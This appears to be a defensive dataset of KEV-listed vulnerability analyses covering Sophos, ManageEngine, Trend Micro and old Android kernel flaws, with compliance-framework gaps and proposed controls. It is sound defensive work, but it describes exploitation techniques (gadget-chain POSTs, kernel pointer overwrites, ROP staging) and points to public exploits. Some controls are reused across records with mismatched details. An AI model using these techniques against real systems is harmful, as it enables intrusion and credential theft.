NIS2-Art21-network-security.gap: Network-security measures treat the firewall as the enforcement point every other measure leans on, yet here it is the initial-access vector, reached through its own internet-facing portal with no credential. The action that mattered — never exposing the portal or Webadmin to the WAN — is a deployment decision the directive does not name, and it has no concept of the security device itself being breached first.

UK-CAF-B4.gap: B4 expects internet-exposed services to be hardened and minimised, but the exposure comes from shipped defaults: the User Portal on 443 is how remote users are meant to reach the device and Webadmin on 4444 is how it is managed. With PR:N there is no credential to strengthen and no session to constrain, because the injection is evaluated before authentication.

AU-Essential-8-Patch.gap: The patch-applications and patch-operating-systems controls are scoped to workstations, servers and their applications; network-security appliance firmware sits outside that scope entirely, and the model has no maturity criterion for a vendor-pushed auto-hotfix, which is the mechanism that actually delivered this fix. An organisation at Maturity Level 3 could be fully compliant while running unhotfixed end-of-life SFOS.

ISO-27001-2022-A.8.9.gap: Configuration management is satisfied by documenting and enforcing an approved baseline, and for most deployments that baseline mirrors the Sophos default with the portal and Webadmin WAN-reachable. A.8.9 tests conformance to the documented configuration, never whether the documented configuration is safe, so the auditor sees a clean drift-monitored record wrapped around an unauthenticated Perl-eval endpoint on the internet.

new_control_requirements.name: PERIMETER-DEVICE-ZERODAY-SLA-TIER
new_control_requirements.description: Compliance frameworks must define a distinct patch SLA tier for pre-auth RCE on perimeter-trust-boundary devices (firewalls, VPN concentrators, WAFs, edge load-balancers). Tier requirement: vendor-mitigation deployed within 4 hours of KEV listing OR isolation of the vulnerable interface; standard 14/30-day SLAs do not apply because the device IS the trust boundary.
new_control_requirements.evidence: CVE-2022-3236 is unauthenticated root on the firewall itself, reached through the User Portal on TCP 443 and Webadmin on TCP 4444 that Sophos ships listening by default, KEV-listed 2022-09-23 with Sophos confirming attacks already under way against organisations chiefly in South Asia. Appliance firmware falls outside the workstation/server patch controls entirely, so only a perimeter-specific tier expresses the two actions that mattered — hotfix within hours, or take the portal and Webadmin off the WAN.

new_control_requirements.name: VENDOR-PUSH-MITIGATION-OPT-IN-PRE-DISCLOSURE
new_control_requirements.description: For vendors offering push-mitigation services (Microsoft EEMS, Palo Alto Threat Prevention auto-update, etc.), opt-in must be enabled BEFORE the next disclosure event, not in response to it. Compliance frameworks must require operators to enable available vendor-push-mitigation services as a baseline control — opt-in late means the mitigation rule arrives after exploitation, not before.
new_control_requirements.evidence: CVE-2022-3236 was remediated for roughly 99% of affected organisations by hotfixes Sophos pushed on 2022-09-21 and 2022-09-23 that installed with no firmware upgrade and no reboot — but only on appliances where 'Allow automatic installation of hotfixes' was still enabled, which is why Sophos had to republish backports in December 2023 after fresh exploit attempts against the remainder. The toggle had to be on before disclosure, and the applied-hotfix state on each appliance has to be verified rather than assumed from the documented baseline.

new_control_requirements.name: PERIMETER-COMPROMISE-REBUILD-NOT-PATCH
new_control_requirements.description: Pre-rehearsed IR runbook for any perimeter device that suffers a pre-auth RCE CVE in active exploitation MUST default to config-exfil + rebuild + credential rotation, not patch-in-place. Patch-in-place leaves attacker-installed implants intact.
new_control_requirements.evidence: CVE-2022-3236 executes backticked shell commands as root inside the device that anchors trust for everything behind it, and Sophos disclosed it alongside confirmation that it was already being used against a targeted set of organisations. A hotfix applied over an appliance that was already reached closes the entry point while leaving the attacker in place along with every credential, certificate and VPN secret the firewall held, so the runbook has to default to rebuild-and-rotate before those segmentation and filtering decisions can be trusted again.

CVE-2022-35405.name: Zoho ManageEngine Multiple Products Remote Code Execution Vulnerability (CVE-2022-35405)

attack_vector.description: An unauthenticated POST to /xmlrpc carries an XML-RPC <methodCall> whose parameters embed a Java-serialised gadget chain; the exposed parser deserialises it and yields command execution as SYSTEM on Windows deployments of Password Manager Pro and PAM360. One request converts a privileged-credential vault into the attacker's, because the code runs inside the process that brokers every secret the vault holds.
attack_vector.privileges_required: none for Password Manager Pro and PAM360 — PR:N; the same flaw in Access Manager Plus requires authentication, a split the shared CVSS vector flattens
attack_vector.complexity: low — AC:L, UI:N, a single POST; the Metasploit module is rated ExcellentRanking with CRASH_SAFE and REPEATABLE_SESSION, and a Nuclei template fingerprints the reachable parser from its 'No such service' / 'No such handler' faultString replies
attack_vector.ai_factor: Not AI-discovered — ManageEngine credits the researcher Vinicius, who published the PoC and is the discovery author on the Metasploit module, with independent analysis by Y4er. Conventional human research on an exposed XML-RPC endpoint and a Java gadget chain.

prevention.what_would_have_worked: Apply the vendor upgrade packs — Password Manager Pro 12101, PAM360 5510, Access Manager Plus 4303 — which remove the vulnerable parser and components rather than hardening them, and keep the vault's management plane off untrusted networks.
prevention.adequacy: The fixed builds shipped in June 2022, three months before the KEV listing, so the vendor side was never the constraint; blocking /xmlrpc at a reverse proxy or WAF buys time for instances that cannot take the .ppm immediately but is not a fix, and any suspected exploitation still requires rotation of every credential the vault held.

detection.what_would_have_worked: Alerting on any request to /xmlrpc on the vault host, on the PMP/PAM360 java service spawning powershell.exe or cmd.exe, and on credential check-outs that do not correspond to an approved workflow.
detection.adequacy: In-product detection is evaluated by the vault's own software, which the attacker controls after execution, so the dependable signals are external — network-level /xmlrpc requests and downstream use of vaulted credentials on the systems they unlock.

response.what_would_have_worked: Assume every credential the vault brokered is compromised: rotate domain, database, network-device and service accounts wholesale, revoke active sessions, and rebuild the vault host before reloading any secret into it.
response.adequacy: Response scope is the vault's contents, not the host — upgrading the build without wholesale rotation leaves the attacker holding valid credentials for systems the exploit never touched, and those logins look entirely legitimate.

NIST-800-53-SC-28.gap: Encryption at rest is what a vault is bought to evidence, and the stored passwords were encrypted. The exploit executes as SYSTEM inside the vault process, inheriting its decryption path and master-key handling — SC-28 defends against disk theft, not against code execution in the process that holds the key, and draws no distinction between the two.

DORA-Art-9.gap: Art.9 requires protection of ICT systems and control of privileged access, and deploying a PAM product is the standard way to evidence it. Here the evidencing control is the entry point: one unauthenticated XML-RPC request surrenders every privileged credential the entity holds, and DORA sets no requirement that the PAM platform's own management plane be unreachable from untrusted networks.

UK-CAF-B2.gap: B2 accepts a privileged-access-management deployment as the assurance argument for how privileged accounts are governed. With PR:N no account is used at all, and the prize is the full set of domain, database and network-device credentials the vault brokered — B2 assesses the strength of access decisions but never whether the component making them can be executed on without authenticating.

AU-Essential-8-MFA.gap: MFA maturity is assessed on authentication surfaces, and a PAM console is exactly the system E8 wants covered. The /xmlrpc path never reaches an authentication check because deserialisation happens in the request parser, so console MFA contributes nothing here, and no E8 control would have driven removal or restriction of the unauthenticated endpoint.

ISO-27001-2022-A.5.15.gap: Access control in a PAM deployment means check-out workflows, approvals and session recording, all enforced by the vault application. SYSTEM execution inside that application means every rule is evaluated by software the attacker already controls, and the recordings that would evidence the control are equally reachable — an intact-enforcement-point precondition A.5.15 never states and no certification test examines.

new_control_requirements.name: SECURITY-TOOL-INTEGRITY-VERIFICATION
new_control_requirements.description: Security tools (AV/AM, EDR, vulnerability scanners) must be treated as in-scope of vulnerability management with the same SLAs as other privileged software. Definition-update channels must use TLS with certificate pinning. Compliance audits must include a trust-anchor-inversion test: deliver a crafted input to the security tool in a sandbox and confirm rejection.
new_control_requirements.evidence: CVE-2022-35405 is one unauthenticated POST to /xmlrpc whose Java-serialised gadget chain is deserialised in the request parser and executes as SYSTEM inside Password Manager Pro / PAM360 — the credential vault that was bought to evidence privileged-access control now evaluating every check-out workflow, approval and session recording as software the attacker owns. A trust-anchor-inversion test that delivers crafted input to the security product itself is the only audit step that asks whether the enforcement point survives its own input handling.

new_control_requirements.name: PEN-TEST-SCOPE-INCLUDES-SECURITY-PRODUCTS
new_control_requirements.description: Penetration test and red-team scopes must explicitly include security-defense products (EDR, AV, DLP, identity-providers, secret-managers) as in-scope attack surface, not as defenses to evade. Scope language must call out that these products' admin interfaces, agent processes, and update channels are testable surfaces.
new_control_requirements.evidence: CVE-2022-35405's reachable /xmlrpc parser sat on a secret manager that test scopes routinely list as a defence rather than a target, even though PR:N means no credential is used and the reward is every domain, database and network-device credential the vault brokered. Zoho's fixed builds shipped in June 2022, three months before the 2022-09-22 KEV listing, so a scope that treated the PAM platform's own management plane as testable surface had a full quarter in which to find the unauthenticated endpoint.

CVE-2022-40139.name: Trend Micro Apex One and Apex One as a Service Improper Validation Vulnerability

attack_vector.description: An attacker who already holds Apex One server administration console access instructs managed clients to download a rollback package whose components the agent does not validate before installing. The attacker-supplied package then executes in the endpoint-protection agent's own service context, with its trust and exclusions, on every machine the console reaches — one authorised-looking instruction fanning out across the estate.
attack_vector.privileges_required: high — PR:H; Apex One server administration console access, realistically obtained through credential theft or session hijack against the security-operations console
attack_vector.complexity: low — AC:L, UI:N once console access is held, with no memory corruption to get right; no public exploit exists because the primitive is abuse of an authorised administrative action rather than a network-reachable bug, so there is nothing a scanner can reach
attack_vector.ai_factor: Not AI-discovered — Trend Micro disclosed it in its September 2022 Apex One bulletin as a flaw it had already observed at least one active exploitation attempt against, crediting no external researcher and no ZDI case. No AI tooling appears in any primary source.

prevention.what_would_have_worked: Bring both the Apex One server and its managed agents to the fixed build — 2019 on-premise Service Pack 1 build b11092/11088 or later, and the August 2022 (202208) monthly patch for Apex One as a Service — and restrict the console to trusted management networks with MFA and auditing on every administrator account.
prevention.adequacy: The patch closes the unverified-rollback path, but because the flaw lives in the client-side rollback logic driven from the server, both halves must reach the fixed build before the estate is covered — and since the exploit rides an authorised console action, the durable control is treating the endpoint-protection console as tier-0 identity.

detection.what_would_have_worked: Auditing console logins and administrator account changes, and reviewing rollback and update jobs for component versions that do not match Trend Micro's published builds.
detection.adequacy: The activity is indistinguishable from routine administration in the product's own logs, and the agent that would normally flag the resulting code is the process executing it, so detection has to come from console-side auditing rather than endpoint telemetry.

response.what_would_have_worked: Revoke console sessions and administrator credentials, verify component versions on every managed agent against vendor-published builds, and treat any endpoint that accepted an unrecognised rollback package as compromised at agent-service privilege.
response.adequacy: Response has to fan out the same way the attack did: a single console instruction reached the whole estate, so containment scoped to the server leaves attacker code running inside the security agent on every client that already pulled the package.

NIST-800-53-SR-11.gap: Component authenticity asks for anti-counterfeit and verification measures over acquired components, but the component that went unverified is one the operator never handles — the rollback package the agent fetches on its own server's instruction. KEV maps this to missing integrity-check support, a property the operator cannot add to a closed endpoint agent, so procurement-side SR-11 work produces no coverage for the gap that mattered.

NIS2-Art21-supply-chain.gap: Supplier assessment examines the relationship — development practices, provenance, support commitments — while the failure sits inside a trusted supplier's own distribution channel and arrives through a console the operator legitimately uses. That the agent installs whatever its management server names, unverified, is an internal design property no supplier questionnaire is shaped to surface.

UK-CAF-B2.gap: B2 would classify the Apex One console as an administrative interface needing privileged-account separation and strong authentication, and many deployments run it as a shared operations console instead. This CVE makes console access equivalent to arbitrary code execution on every managed endpoint through the rollback channel, so the account-tiering decision has to be taken against estate-wide blast radius, not console-scoped risk.

AU-ISM-1808.gap: Software supply-chain risk management sees the product as an artefact received and evidences it with questionnaires, provenance and vendor attestation. None of that asks whether the product's own agent verifies the integrity of packages its management server tells it to install, so a fully compliant assessment would have rated Apex One low risk on precisely the property that failed.

ISO-27001-2022-A.8.7.gap: Protection against malware is evidenced by showing centrally managed anti-malware deployed, updated and monitored — the very deployment this CVE converts into a code-execution channel to every endpoint. The artefact that satisfies the control is the artefact carrying the risk, and no step in the A.8.7 test asks whether a rollback to an older build is an integrity-checked operation.

new_control_requirements.name: ENDPOINT-MGMT-DEPLOYMENT-CHANNEL-INTEGRITY
new_control_requirements.description: Treat the EDR/endpoint-management server's agent-deployment channel (package/key-table → agent push) as a privileged supply-chain control plane: integrity-monitor the deployment artifacts and key tables, alert on agent pushes not tied to a sanctioned admin action, and patch the management server to the fixed build (Apex One on-prem 14.0.0.17079 / SaaS 14.0.20731) as a KEV-priority item. A server foothold must not silently become fleet-wide agent code execution.
new_control_requirements.evidence: CVE-2022-40139 is the Apex One agent installing a rollback package its own management server named without validating the components (KEV maps it to missing integrity-check support), so the deployment channel itself is the code-execution primitive and one console instruction fans out to every managed endpoint. Because the flaw lives in client-side rollback logic driven from the server, both halves must reach the fixed build, and integrity-monitoring the deployment artifacts plus alerting on pushes not tied to a sanctioned admin action is the only measure that reaches inside a closed agent's update path.

new_control_requirements.name: FLEET-CONTROL-PLANE-ADMIN-PRIVILEGE-TIER
new_control_requirements.description: Administrators of fleet-control-plane systems (MDM/UEM, EDR consoles, identity providers, container orchestrators, configuration management) must be classified as a distinct privilege tier above application admins, with: PAM-jumphost-only access, FIDO2 step-up per session, just-in-time elevation with approval workflow, separate identity from any other admin role, and dedicated PAW (privileged access workstation) hardware. Compliance frameworks must enumerate this tier explicitly rather than collapsing it into 'admin'.
new_control_requirements.evidence: CVE-2022-40139 requires PR:H — Apex One server administration console access, realistically obtained by credential theft or session hijack — and converts it into arbitrary code execution on every client the console reaches, yet many estates run that console as a shared security-operations login rather than a tier-0 identity. The account-tiering decision has to be taken against estate-wide blast radius, which is only possible once the EDR console is enumerated as a fleet-control-plane tier in its own right.

new_control_requirements.name: EDR-AS-VULNERABILITY-SECONDARY-OVERLAY
new_control_requirements.description: Organizations whose primary EDR is also a high-value attack target (Defender, CrowdStrike, SentinelOne) must deploy an independent secondary overlay capable of detecting anomalous behavior by the primary EDR's own processes. The overlay can be a second-vendor behavioral EDR, network-side EDR-bypass telemetry, or out-of-band SYSTEM-process spawn monitoring — but must NOT share trust roots with the primary EDR.
new_control_requirements.evidence: CVE-2022-40139's rollback payload executes in the Apex One agent's own service context with its trust and exclusions, so the product that would normally flag the code is the process running it, and the console-side activity is indistinguishable from routine administration in the vendor's own logs. Only an overlay that shares no trust root with Apex One can observe the endpoint-protection agent behaving as the attacker.

CVE-2013-6282.name: Linux Kernel Improper Input Validation Vulnerability (CVE-2013-6282)

attack_vector.description: An unprivileged Android application hands a kernel-space pointer to a syscall that reaches the ARM get_user/put_user helpers; on ARMv6k/v7 kernels built without CONFIG_CPU_USE_DOMAINS the __user pointer is never validated. The resulting arbitrary kernel read locates commit_creds and ptmx_fops at runtime, and the matching arbitrary write redirects the ptmx file-operations pointer into user-mapped shellcode that executes with uid 0 — the technique shipped already weaponised inside the vroot rooting application.
attack_vector.privileges_required: low — PR:L in the CVSS 3.1 vector; in practice any installed application, since the only precondition is unprivileged code on the handset, which the CVSS v2 reading of AV:L/AC:L/Au:N captures more faithfully
attack_vector.complexity: low — AC:L and deterministic: the same flaw supplies both the read and the write, so kernel symbols are located at runtime rather than guessed, and the libget_user_exploit source and Metasploit module automate the per-device symbol search down to install-and-run
attack_vector.ai_factor: Not AI-discovered — this predates practical AI-assisted vulnerability discovery by roughly a decade. The fix was already upstream in 3.5.5; its security significance emerged only when the flaw turned up weaponised in the wild in late 2013, and the exploit code was hand-written ARM work.

prevention.what_would_have_worked: On maintained Linux, the upstream fix in 3.5.5 (commit 8404663f81d2, which adds the explicit __user check to arch/arm/include/asm/uaccess.h) or a distro backport such as Ubuntu USN-2067-1. On the Android 4.0-4.3 handsets the CVE names there is no vendor fix reachable today — those devices are long past OEM and carrier support, so the only remaining remediation is replacing the handset or moving it to a maintained third-party kernel.
prevention.adequacy: The patch predated the CVE by over a year, which makes this a build-pipeline failure rather than a patching-speed one: the fix could only reach handsets through an OEM/carrier OTA that mostly never came, and the change sits in an inlined uaccess macro compiled into every caller, so it cannot be hot-swapped even in principle.

detection.what_would_have_worked: Inventory-side identification of device kernels earlier than 3.5.5 on ARMv6k/v7, plus application-reputation checks for known rooting packages such as vroot before they run.
detection.adequacy: Once the arbitrary write lands the exploit runs as uid 0 on a platform with no host sensor to notice, so detection realistically means catching the rooting application at install time — the exploitation itself leaves nothing observable to the OS it just subverted.

response.what_would_have_worked: Retire or reflash the handset — a device rooted through this path cannot be attested — and rotate every credential, token and certificate the device held.
response.adequacy: Reflashing is the only reliable eviction once an attacker holds uid 0, but on unpatchable hardware it restores the same vulnerable kernel, which is why retirement rather than remediation is the terminal answer for this device class.

NIST-800-53-SI-2.gap: Flaw remediation measures from publication, but the fix shipped in 3.5.5 in September 2012, more than a year before the CVE existed — the exposure was never about patching speed. Handset kernels reach operators through OEM and carrier builds that SI-2 timeframes have no authority over, so an estate can be fully compliant while every ARMv6k/v7 phone in it runs the unfixed uaccess macro.

NIS2-Art21-patch-management.gap: Art.21(2)(e) puts vulnerability handling on the entity, but no entity running Android 4.0-4.3 handsets could rebuild the kernel: get_user/put_user is inlined into every caller, so remediation required an OEM image. The compliant output of the process is a documented 'vendor will not fix' for a KEV-listed arbitrary kernel read/write that any installed application can reach.

UK-CAF-B4.gap: Secure configuration offers no lever: exploitation uses ordinary syscalls against the device's own kernel, so no MDM profile, permission revocation or app-store restriction narrows the surface. B4 evidence for a mobile estate rests on OS-version attestation, which reports Android 4.3 as current while the underlying 3.0.x/3.4.x ARM kernel still lacks the pointer check.

AU-Essential-8-Patch.gap: The 48-hour operating-system patching target at Maturity Level 3 is unreachable on hardware whose OEM stopped issuing kernels. An assessment scores the managed Windows fleet at ML2 or ML3 while the BYOD Galaxy S3/S4 and Note 2/3 class carrying a pre-3.5.5 ARM kernel sits permanently unpatched, so the maturity number conceals that blast radius instead of surfacing it.

ISO-27001-2022-A.8.8.gap: A.8.8 requires technical vulnerabilities to be identified for inventoried assets, but mobile registers of that era captured handset model and Android release rather than kernel version or CPU architecture — the two attributes, pre-3.5.5 and ARMv6k/v7, that actually decide exploitability. What cannot be identified is never evaluated and never treated.

new_control_requirements.name: MOBILE-OS-MINIMUM-PATCH-LEVEL-ENFORCEMENT
new_control_requirements.description: Managed mobile fleets must enforce a minimum OS security-patch level as a condition of access to organizational data, not merely report it. For Android, the MDM/EMM must read the device security-patch level and block or quarantine devices below the patch level that fixes a KEV-listed Framework flaw (here, 2026-06-01), and constrain installation of untrusted/side-loaded apps on devices that cannot yet update - since the privilege escalation is driven by locally running code. The distinguishing test: enroll a device pinned below 2026-06-01 and confirm the MDM policy denies it access to protected resources (rather than only recording the stale patch level on a dashboard) - paper 'mobile patching' policies that surface patch level without enforcing it leave exploitable devices in production.
new_control_requirements.evidence: CVE-2013-6282's fix shipped upstream in Linux 3.5.5 in September 2012, more than a year before the CVE, and reached handsets only through OEM and carrier builds that mostly never came — so OS-version attestation reports Android 4.3 as current while the ARMv6k/v7 kernel underneath still lacks the __user check. The exploit arrives as locally running code (it shipped already weaponised inside the vroot rooting application), so reading the device patch level, denying protected-resource access below it, and constraining untrusted app installation are the only levers an operator holds over a build pipeline it does not control.

new_control_requirements.name: EOL-ASSET-DECOMMISSION
new_control_requirements.description: Network-reachable end-of-life devices with no vendor patch path must be isolated and decommissioned within a bounded window; mandatory compensating segmentation applies until removal since no remediation exists.
new_control_requirements.evidence: CVE-2013-6282 gives arbitrary kernel read and write to any installed application on Android 4.0-4.3 handsets that are long past OEM and carrier support, and the fix sits in an inlined uaccess macro compiled into every caller, so it cannot be hot-swapped and no live-patch stream ever covered 32-bit ARM Android. Replacement within a bounded window — with the handset kept away from organisational data until then — is the remediation; the alternative outcome a patch-management process produces is a documented 'vendor will not fix' for a KEV-listed kernel takeover.

CVE-2013-2597.name: Code Aurora ACDB Audio Driver Stack-based Buffer Overflow Vulnerability

attack_vector.description: An application in the audio or system group opens /dev/msm_acdb and issues an ACDB ioctl with an oversized size argument; acdb_ioctl copies that many bytes from user space into a fixed local stack buffer, smashing the saved R4-R10 and PC registers. The published method recovers the exact register offsets by deliberately panicking the kernel with dummy values and reading them back from the crash log, then chains ROP gadgets taken from the device's own kernel image to write an attacker-chosen value at an attacker-chosen address and return cleanly with kernel privileges.
attack_vector.privileges_required: none beyond audio or system group membership — PR:N; an ordinary application holding RECORD_AUDIO obtains the group that can open /dev/msm_acdb
attack_vector.complexity: low — AC:L for the overflow itself, a textbook unbounded copy with no race, no heap grooming and no information leak; the real work is in the ROP stage, which is retuned per device and per build, which is why EPSS stays near 0.015 despite the KEV listing
attack_vector.ai_factor: Not AI-discovered — androidvulnerabilities.org records @fi01_IS01 and Xuxian Jiang as finders in May 2013, outside coordinated disclosure, and the same researcher published both the walkthrough and working exploit. Hand-written ARM ROP against a specific device kernel image, with no AI tooling anywhere in the chain.

prevention.what_would_have_worked: Firmware carrying the post-2013-06-21 Code Aurora fix from advisory QCIR-2013-00002-1, which bounds the user-supplied size in acdb_ioctl — reachable only where a handset OEM rebased its board-support package and shipped an OTA. For the Qualcomm MSM devices in scope that image mostly never arrived, so retirement of the handset is the remaining remediation.
prevention.adequacy: The driver is compiled into the boot image rather than loaded as a module, so it cannot be replaced without reflashing, and the vendor advisory URL NVD carries is now a dead link — operators cannot even confirm from first-party documentation which builds contain the fix, let alone obtain one for an unsupported device.

detection.what_would_have_worked: Collecting device crash logs and alerting on the kernel panics the published exploitation method deliberately induces to recover register offsets, since that reconnaissance stage precedes a working exploit on an unfamiliar build.
detection.adequacy: Crash-log collection from Android 4.x handsets was rare in practice, and once the offsets for a build are known the exploit reproduces without further panics — so the only detectable phase is the one an attacker performs once, on a device they already hold.

response.what_would_have_worked: Reflash or retire the device, rotate whatever credentials and tokens it held, and review which applications were installed with the audio permission that provided the entry point.
response.adequacy: Kernel privilege on a handset defeats any application-level containment, so response has to be device-level; without a fixed firmware image, reflashing simply restores the same vulnerable driver.

NIST-800-53-AC-6.gap: Least privilege looks satisfied — /dev/msm_acdb belongs to the audio and system groups rather than being world-accessible — yet any app granted RECORD_AUDIO joins that group, so the least privilege needed to smash acdb_ioctl's stack and take the kernel is a microphone permission. AC-6 reasons about who receives a privilege, never about what an ioctl handler does with a user-supplied length.

NIS2-Art21-supply-chain.gap: Supplier-risk measures were aimed at the handset vendor while the defective driver is Qualcomm/Code Aurora board-support code inherited unmodified two tiers upstream. Assurance questionnaires do not reach a kernel driver the OEM neither wrote nor audited, and Art.21's transitive-dependency language has no equivalent of an SBOM for a flashed boot image.

UK-CAF-B4.gap: B4 assumes attack surface can be reduced by configuration, but /dev/msm_acdb is the node the audio calibration subsystem needs to function — removing it breaks audio on every MSM handset. There is no compensating control B4 can name for an unbounded copy_from_user into a stack buffer inside a driver the operator cannot rebuild.

AU-ISM-1808.gap: The control assumes an operator can inventory components and validate software integrity. For a Code Aurora driver baked into a device image there is no component record, no version string to compare against QCIR-2013-00002-1 and no way to determine whether a given build carries the 2013-06-21 fix, so its evidence requirements simply cannot be met on this asset class.

ISO-27001-2022-A.8.8.gap: A.8.8 schedules remediation by risk classification, and the two available signals disagree: EPSS sits near 0.015 because exploitation is local, silent and device-resident, while CISA lists the CVE as actively exploited. A process that prioritises on exploit-probability scoring alone deprioritises a confirmed-exploited kernel takeover that any installed app can reach.

new_control_requirements.name: MOBILE-OS-MINIMUM-PATCH-LEVEL-ENFORCEMENT
new_control_requirements.description: Managed mobile fleets must enforce a minimum OS security-patch level as a condition of access to organizational data, not merely report it. For Android, the MDM/EMM must read the device security-patch level and block or quarantine devices below the patch level that fixes a KEV-listed Framework flaw (here, 2026-06-01), and constrain installation of untrusted/side-loaded apps on devices that cannot yet update - since the privilege escalation is driven by locally running code. The distinguishing test: enroll a device pinned below 2026-06-01 and confirm the MDM policy denies it access to protected resources (rather than only recording the stale patch level on a dashboard) - paper 'mobile patching' policies that surface patch level without enforcing it leave exploitable devices in production.
new_control_requirements.evidence: CVE-2013-2597 needs nothing more than membership of the audio group — which any application granted RECORD_AUDIO obtains — to open /dev/msm_acdb and smash acdb_ioctl's stack on a Qualcomm MSM handset that never took the 2013-06-21 Code Aurora fix. Since the escalation is driven entirely by locally installed code, blocking devices below the fixed build from organisational data and constraining untrusted app installation are the enforceable levers, and keying that enforcement to the KEV listing rather than to EPSS matters here because EPSS sits near 0.015 on a confirmed-exploited kernel takeover.

new_control_requirements.name: EOL-ASSET-DECOMMISSION
new_control_requirements.description: Network-reachable end-of-life devices with no vendor patch path must be isolated and decommissioned within a bounded window; mandatory compensating segmentation applies until removal since no remediation exists.
new_control_requirements.evidence: CVE-2013-2597's driver is compiled into the boot image rather than loaded as a module, so it cannot be replaced without reflashing an OEM firmware image that for these MSM handsets never shipped, and the vendor advisory URL NVD carries for QCIR-2013-00002-1 is now a dead link. /dev/msm_acdb cannot be removed without breaking audio on the device, so there is no configuration lever left and bounded-window retirement is the only remediation available.

new_control_requirements.name: TIER-3-DEPENDENCY-INVENTORY
new_control_requirements.description: Supply chain inventory must extend to tier-3 dependencies (dependencies of dependencies of direct dependencies). SBOM coverage for libsystemd-class transitive dependencies cannot be omitted under SR-3.
new_control_requirements.evidence: CVE-2013-2597 lives in Qualcomm/Code Aurora board-support code inherited unmodified into every MSM-based OEM Android build — two tiers upstream of the handset vendor that supplier assessments were pointed at — with no component record, no version string to compare against QCIR-2013-00002-1 and no SBOM for a flashed boot image. Inventory that reaches transitive upstream components is the precondition for knowing the vulnerable driver is present at all, which is why the assessment could not be evidenced on this asset class.

attack_vector.description: A crafted mmap2 call against /dev/graphics/fb0 supplies offset and length values that overflow the arithmetic in fb_mmap (drivers/video/fbmem.c), so the kernel installs a read-write mapping covering the whole of kernel memory rather than just the framebuffer aperture. The exploit then patches its own task credentials in place to reach uid 0 — the behaviour Dan Rosenberg's Motochopper pwn program demonstrated against Motorola Android 4.1.2 builds.
attack_vector.privileges_required: low — PR:L; write access to /dev/graphics/fb0, normally restricted to root and the video group on general-purpose Linux but reachable from the ADB shell on the Motorola builds this CVE names
